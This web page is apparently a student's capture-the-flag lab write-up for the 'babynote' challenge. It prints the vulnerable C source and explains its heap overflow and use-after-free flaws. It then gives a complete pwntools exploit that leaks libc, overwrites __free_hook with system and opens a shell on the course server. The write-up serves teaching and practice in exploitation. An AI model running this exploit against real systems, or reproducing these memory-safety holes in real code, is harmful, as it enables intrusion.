<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x18(Lab - babynote)
  #


  tags: CTF PWN eductf
  #

Version: Ubuntu 20.04

  Background
  #


hook - SS111-Pwn2

Hook簡介
Hook Function (攔截函式)
The process of free and priority
Assume we malloc a memory with size over 0x410, then when we free it, it&rsquo;ll be classified to Unsorted bin instead of tcache




  Original Code
  #

:::spoiler code
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct Note
{
    char name[0x10];
    void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
    short int idx;

    printf("index\n> ");
    scanf("%hu", &amp;idx);

    if (idx >= 0x10)
        printf("no, no ...\n"), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf("size\n> ");
    scanf("%hu", &amp;size);
    
    return size;
}

void add_note()
{
    short int idx;

    idx = get_idx();
    notes[idx] = malloc(sizeof(*notes[idx]));

    printf("note name\n> ");
    read(0, notes[idx]->name, 0x10);

    notes[idx]->data = NULL;
    printf("success!\n");
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (notes[idx]->data == NULL)
        notes[idx]->data = malloc(size);
    
    read(0, notes[idx]->data, size);
    printf("success!\n");
}

void del_note()
{
    short int idx;

    idx = get_idx();
    free(notes[idx]->data);
    free(notes[idx]);
    printf("success!\n");
}

void show_notes()
{
    for (int i = 0; i < 0x10; i++) {
        if (notes[i] == NULL || notes[i]->data == NULL)
            continue;
        
        printf("[%d] %s\ndata: %s\n", i, notes[i]->name, (char *)notes[i]->data);
    }
}

int main()
{
    char opt[2];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        printf("1. add_note\n"
               "2. edit_data\n"
               "3. del_note\n"
               "4. show_notes\n"
               "5. bye\n"
               "> ");
        read(0, opt, 2);

        switch (opt[0]) {
        case &#39;1&#39;: add_note(); break;
        case &#39;2&#39;: edit_data(); break;
        case &#39;3&#39;: del_note(); break;
        case &#39;4&#39;: show_notes(); break;
        case &#39;5&#39;: exit(0);
        }
    }
    
    return 0;
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x18(Lab - `babynote`)"><meta property="og:description" content='Simple PWN 0x18(Lab - babynote) # tags: CTF PWN eductf # Version: Ubuntu 20.04
Background # hook - SS111-Pwn2 Hook簡介 Hook Function (攔截函式) The process of free and priority Assume we malloc a memory with size over 0x410, then when we free it, it’ll be classified to Unsorted bin instead of tcache Original Code # :::spoiler code
#include <stdio.h> #include <stdlib.h> #include <unistd.h> struct Note { char name[0x10]; void *data; }; struct Note *notes[0x10]; static short int get_idx() { short int idx; printf("index\n> "); scanf("%hu", &amp;idx); if (idx >= 0x10) printf("no, no ...\n"), exit(1); return idx; } static short int get_size() { short int size; printf("size\n> "); scanf("%hu", &amp;size); return size; } void add_note() { short int idx; idx = get_idx(); notes[idx] = malloc(sizeof(*notes[idx])); printf("note name\n> "); read(0, notes[idx]->name, 0x10); notes[idx]->data = NULL; printf("success!\n"); } void edit_data() { short int idx; short int size; idx = get_idx(); size = get_size(); if (notes[idx]->data == NULL) notes[idx]->data = malloc(size); read(0, notes[idx]->data, size); printf("success!\n"); } void del_note() { short int idx; idx = get_idx(); free(notes[idx]->data); free(notes[idx]); printf("success!\n"); } void show_notes() { for (int i = 0; i < 0x10; i++) { if (notes[i] == NULL || notes[i]->data == NULL) continue; printf("[%d] %s\ndata: %s\n", i, notes[i]->name, (char *)notes[i]->data); } } int main() { char opt[2]; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); while (1) { printf("1. add_note\n" "2. edit_data\n" "3. del_note\n" "4. show_notes\n" "5. bye\n" "> "); read(0, opt, 2); switch (opt[0]) { case &#39;1&#39;: add_note(); break; case &#39;2&#39;: edit_data(); break; case &#39;3&#39;: del_note(); break; case &#39;4&#39;: show_notes(); break; case &#39;5&#39;: exit(0); } } return 0; } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta property="article:tag" content="Eductf"><title>Simple PWN 0x18(Lab - `babynote`) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x18(Lab - `babynote`)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#original-code>Original Code</a><ul><li><a href=#description>Description</a></li><li><a href=#something-wrong>Something Wrong</a></li><li><a href=#preliminary-idea>Preliminary Idea</a></li></ul></li><li><a href=#exploit---uaf--heap-overflow--__free_hook>Exploit - UAF + heap overflow + __free_hook</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x18lab---babynote>Simple PWN 0x18(Lab - <code>babynote</code>)
<a class=anchor href=#simple-pwn-0x18lab---babynote>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>hook - <a href="https://youtu.be/MwjSNFQIx0c?t=838">SS111-Pwn2</a>
<img src=https://imgur.com/lx8zR2J.png alt>
<a href=https://blog.xuite.net/peterlee.tw/twblog/112094832>Hook簡介</a>
<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&amp;url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&amp;usg=AOvVaw26FwxmT40uQgIsFIlbjs2k">Hook Function (攔截函式)</a></li><li>The process of free and priority
Assume we malloc a memory with size over <font color=FF0000><code>0x410</code></font>, then when we free it, it&rsquo;ll be classified to <font color=FF0000><code>Unsorted bin</code></font> instead of <code>tcache</code>
<img src=https://imgur.com/kCTN7cs.png alt>
<img src=https://imgur.com/u2Wy9xw.png alt></li></ul><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

struct Note
{
    char name[0x10];
    void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
    short int idx;

    printf(&#34;index\n&gt; &#34;);
    scanf(&#34;%hu&#34;, &amp;idx);

    if (idx &gt;= 0x10)
        printf(&#34;no, no ...\n&#34;), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf(&#34;size\n&gt; &#34;);
    scanf(&#34;%hu&#34;, &amp;size);
    
    return size;
}

void add_note()
{
    short int idx;

    idx = get_idx();
    notes[idx] = malloc(sizeof(*notes[idx]));

    printf(&#34;note name\n&gt; &#34;);
    read(0, notes[idx]-&gt;name, 0x10);

    notes[idx]-&gt;data = NULL;
    printf(&#34;success!\n&#34;);
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (notes[idx]-&gt;data == NULL)
        notes[idx]-&gt;data = malloc(size);
    
    read(0, notes[idx]-&gt;data, size);
    printf(&#34;success!\n&#34;);
}

void del_note()
{
    short int idx;

    idx = get_idx();
    free(notes[idx]-&gt;data);
    free(notes[idx]);
    printf(&#34;success!\n&#34;);
}

void show_notes()
{
    for (int i = 0; i &lt; 0x10; i++) {
        if (notes[i] == NULL || notes[i]-&gt;data == NULL)
            continue;
        
        printf(&#34;[%d] %s\ndata: %s\n&#34;, i, notes[i]-&gt;name, (char *)notes[i]-&gt;data);
    }
}

int main()
{
    char opt[2];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        printf(&#34;1. add_note\n&#34;
               &#34;2. edit_data\n&#34;
               &#34;3. del_note\n&#34;
               &#34;4. show_notes\n&#34;
               &#34;5. bye\n&#34;
               &#34;&gt; &#34;);
        read(0, opt, 2);

        switch (opt[0]) {
        case &#39;1&#39;: add_note(); break;
        case &#39;2&#39;: edit_data(); break;
        case &#39;3&#39;: del_note(); break;
        case &#39;4&#39;: show_notes(); break;
        case &#39;5&#39;: exit(0);
        }
    }
    
    return 0;
}
</code></pre><p>:::</p><h3 id=description>Description
<a class=anchor href=#description>#</a></h3><p>The data structure is as below, we can use <code>add_note</code> to create a new note and use <code>edit_note</code> to add/modify the data of note. Or just delete specific note or use <code>show_note</code> to print all of them.
<img src=https://imgur.com/nKwVmdO.png alt></p><h3 id=something-wrong>Something Wrong
<a class=anchor href=#something-wrong>#</a></h3><ul><li><p>edit_note has heap overflow
So that we can add 2 notes and use edit function to overlap the 2nd notes.</p><pre tabindex=0><code class="language-python=" data-lang="python=">add_note(0, b&#39;a&#39;*8)
edit_note(0, 0xa, b&#39;a&#39;)

add_note(1, b&#39;b&#39;*8)
edit_note(1, 0x30, b&#39;a&#39;*48) #&lt;-- overlap
</code></pre><ul><li><p>Before overlap
<img src=https://imgur.com/2BZOqMu.png alt></p></li><li><p>After overlap
<img src=https://imgur.com/zVCt3bR.png alt></p></li></ul></li><li><p>used after free(UAF)
It has not deleted the pointer when it was freed</p><pre tabindex=0><code class=language-cpp! data-lang=cpp!>void del_note()
{
    short int idx;

    idx = get_idx();
    free(notes[idx]-&gt;data);
    free(notes[idx]);
    printf(&#34;success!\n&#34;);
}
</code></pre></li></ul><h3 id=preliminary-idea>Preliminary Idea
<a class=anchor href=#preliminary-idea>#</a></h3><p>Based on the problem we found above, we can try to use <code>__free_hook</code> to execute <font color=FF0000><code>system('/bin/sh')</code></font></p><h2 id=exploit---uaf--heap-overflow--__free_hook>Exploit - UAF + heap overflow + __free_hook
<a class=anchor href=#exploit---uaf--heap-overflow--__free_hook>#</a></h2><ol><li><p>Try to construct heap structure that we need</p><pre tabindex=0><code class=language-python! data-lang=python!>add_note(0, b&#39;a&#39;*8)    # index 0
edit_note(0, 0x418, b&#39;a&#39;)

add_note(1, b&#39;b&#39;*8)    # index 1
edit_note(1, 0x18, b&#39;b&#39;)

add_note(2, b&#39;c&#39;*8)    # index 2
</code></pre><ul><li><code>index 0</code> is for leaking the address of <code>libc</code></li><li><code>index 1</code> is to implement heap overflow</li><li><code>index 2</code> is a fake chunk that we have to construct</li></ul></li><li><p>Leak <code>libc</code> address and find <code>__free_hook</code>, <code>__libc_system</code></p></li></ol><ul><li><p>The reason that we set the data size of <code>index 0</code> be <code>0x418</code>(1048 in decimal) is because when we free it, it will be classified to <code>Unsorted bin</code> and the <code>fd</code> and <code>bk</code> will store the address of <code>libc</code>
<img src=https://imgur.com/6vhQrxv.png alt>
<img src=https://imgur.com/pTCDtZo.png alt>
Then we have to find where is <code>__libc_system</code> and <code>__free_hook</code></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; p __libc_system
$1 = {int (const char *)} 0x7f9614bac290 &lt;__libc_system&gt;
pwndbg&gt; p &amp;__free_hook
$2 = (void (**)(void *, const void *)) 0x7f9614d48e48 &lt;__free_hook&gt;
</code></pre><p>The offset is
<code>Unsorted bin fd</code>: $0x7f9614d46be0 - 0x7f9614b5a000 = 0x1ecbe0$
<code>__libc_system</code>: $0x7f9614bac290 - 0x7f9614b5a000 = 0x52290$
<code>__free_hook</code>: $0x7f9614d48e48 - 0x7f9614b5a000 = 0x1eee48$</p><p>So, we delete <code>index 0</code> first, and try to use <code>show_note</code> function to receive the <code>Unsorted bin fd</code></p><pre tabindex=0><code class=language-python! data-lang=python!>delete_note(0)
show_note()
r.recvuntil(b&#39;data:&#39;)
libc = (u64(r.recv(8)) &gt;&gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&#34;libc address: {hex(libc)}&#34;)
free_hook_addr = libc + 0x1eee48
info(f&#34;__free_hook address: {hex(free_hook_addr)}&#34;)
libc_sys_addr = libc + 0x52290
info(f&#34;__libc_system address: {hex(libc_sys_addr)}&#34;)
</code></pre></li></ul><ol start=3><li><p>Construct fake chunk by using heap overflow</p><pre tabindex=0><code class=language-python! data-lang=python!>data = b&#39;/bin/sh\x00&#39;.ljust(0x10, b&#39;b&#39;)
fake_chunk = flat(
    0, 0x21,
    b&#39;cccccccc&#39;, b&#39;cccccccc&#39;,
    free_hook_addr
)

edit_note(1, 0x38, data + fake_chunk)
edit_note(2, 0x8, p64(libc_sys_addr))
</code></pre><p><img src=https://imgur.com/dSw1vms.png alt>
Note that, the data of <code>note</code> structure is a pointer that point to a space that system malloc. Thus, <code>edit_note</code> function will modify the pointed space, so that <code>edit_note(b'2\n', b'8\n', p64(libc_sys_addr))</code> will modify <code>[free_hook_addr]</code> instead of <code>index 2</code>.
<img src=https://imgur.com/ycuFgwR.png alt></p></li><li><p>Delete <code>index 1</code> and call <code>__free_hook</code>
When we free <code>index 1</code> and <code>__free_hook</code> is not NULL, then <code>__free_hook</code> can be a function pointer to execute <code>0x7ffbb6500290</code> that is <code>__libc_system</code> and the parameter is <code>index 1</code> data, that is <code>/bin/sh\x00</code></p><pre tabindex=0><code class=language-python! data-lang=python!>delete_note(1)
</code></pre></li><li><p>Well, we got shell!!
<img src=https://imgur.com/PJGAAba.png alt></p></li></ol><ul><li>Whole exploit
:::spoiler code<pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;./chal&#39;)
r = remote(&#39;edu-ctf.zoolab.org&#39;, 10007)

context.arch = &#39;amd64&#39;

def add_note(idx, note_name):
    r.sendafter(b&#39;&gt; &#39;, b&#39;1&#39;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendafter(b&#39;note name\n&gt; &#39;, note_name)

def edit_note(idx, note_size, message):
    r.sendafter(b&#34;&gt; &#34;, b&#34;2&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))
    r.sendlineafter(b&#39;size\n&gt; &#39;, str(note_size))
    r.send(message)

def delete_note(idx):
    r.sendafter(b&#34;&gt; &#34;, b&#34;3&#34;)
    r.sendlineafter(b&#39;index\n&gt; &#39;, str(idx))

def show_note():
    r.sendafter(b&#34;&gt; &#34;, b&#34;4&#34;)

&#39;&#39;&#39;------------------
Construct heap memory
------------------&#39;&#39;&#39;
add_note(0, b&#39;a&#39;*8)
edit_note(0, 0x418, b&#39;a&#39;)

add_note(1, b&#39;b&#39;*8)
edit_note(1, 0x18, b&#39;b&#39;)

add_note(2, b&#39;c&#39;*8)

&#39;&#39;&#39;------------------
Leak libc address
------------------&#39;&#39;&#39;
delete_note(0)
show_note()
r.recvuntil(b&#39;data:&#39;)
libc = (u64(r.recv(8)) &gt;&gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&#34;libc address: {hex(libc)}&#34;)
free_hook_addr = libc + 0x1eee48
info(f&#34;__free_hook address: {hex(free_hook_addr)}&#34;)
libc_sys_addr = libc + 0x52290
info(f&#34;__libc_system address: {hex(libc_sys_addr)}&#34;)

&#39;&#39;&#39;------------------
Construct fake chunk
------------------&#39;&#39;&#39;
data = b&#39;/bin/sh\x00&#39;.ljust(0x10, b&#39;b&#39;)
fake_chunk = flat(
    0, 0x21,
    b&#39;cccccccc&#39;, b&#39;cccccccc&#39;,
    free_hook_addr
)

edit_note(1, 0x38, data + fake_chunk)
edit_note(2, 0x8, p64(libc_sys_addr))
delete_note(1)

r.interactive()
</code></pre>:::</li></ul><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://youtu.be/MwjSNFQIx0c>SS111-Pwn2</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#original-code>Original Code</a><ul><li><a href=#description>Description</a></li><li><a href=#something-wrong>Something Wrong</a></li><li><a href=#preliminary-idea>Preliminary Idea</a></li></ul></li><li><a href=#exploit---uaf--heap-overflow--__free_hook>Exploit - UAF + heap overflow + __free_hook</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>